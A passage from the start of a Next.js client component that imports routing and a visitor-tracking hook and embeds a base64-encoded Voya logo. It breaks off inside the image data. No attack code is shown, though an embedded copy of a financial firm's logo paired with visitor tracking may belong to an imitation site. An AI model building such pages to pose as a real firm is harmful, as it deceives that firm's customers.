"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

const VOYA_LOGO_BASE64 =
  "data:image/png;base64,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